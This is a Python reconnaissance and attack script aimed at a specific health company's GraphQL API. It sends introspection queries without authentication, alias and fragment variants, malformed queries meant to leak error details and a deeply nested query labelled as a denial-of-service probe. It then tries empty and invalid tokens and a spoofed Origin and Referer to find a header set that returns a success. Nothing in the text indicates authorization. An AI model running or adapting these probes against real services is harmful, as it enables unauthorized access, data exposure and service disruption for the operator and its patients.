#!/usr/bin/env python3
import requests
import json

print("[*] Testing GraphQL-Specific Attack Vectors\n")

url = "https://api.khealth.com/graphql"

attacks = {
    "Empty query (GraphQL errors)": {
        "query": ""
    },
    "Invalid query (info leak)": {
        "query": "{ invalid }"
    },
    "Null query": {
        "query": None
    },
    "Very deep query (DOS)": {
        "query": "{ " * 100 + "user" + " }" * 100
    },
    "Alias attack": {
        "query": """
        {
            a: __schema { types { name } }
            b: __schema { types { name } }
            c: __schema { types { name } }
        }
        """
    },
    "Fragment attack": {
        "query": """
        fragment Test on Query {
            __schema {
                types { name }
            }
        }
        query { ...Test }
        """
    },
    "Introspection (no auth header)": {
        "query": """
        {
            __schema {
                types {
                    name
                }
            }
        }
        """
    }
}

for attack_name, payload in attacks.items():
    print(f"[*] {attack_name}")
    try:
        r = requests.post(url, json=payload, timeout=5)
        print(f"    Status: {r.status_code}")
        
        # Check response for info leaks
        if len(r.text) < 1000:
            print(f"    Response: {r.text[:300]}")
        else:
            print(f"    Response length: {len(r.text)} bytes")
            if '__schema' in r.text or 'type' in r.text.lower():
                print(f"    [!] Possible schema leak detected")
                print(f"    {r.text[:200]}")
    except Exception as e:
        print(f"    Error: {e}")
    print()

# Test with various header combinations
print("\n[*] Testing with different header combinations\n")

headers_list = [
    {},
    {"Authorization": "Bearer invalid"},
    {"Authorization": "Bearer "},
    {"x-wg-token": "invalid"},
    {"Origin": "https://khealth.com"},
    {"Referer": "https://khealth.com"},
    {"User-Agent": "Mozilla/5.0"},
    {"Authorization": ""},
]

for headers in headers_list:
    try:
        r = requests.post(
            url,
            json={"query": "{ __typename }"},
            headers=headers,
            timeout=5
        )
        print(f"Headers {headers}: {r.status_code}")
        if r.status_code == 200:
            print(f"  ✅ SUCCESS with response: {r.text}")
    except:
        pass

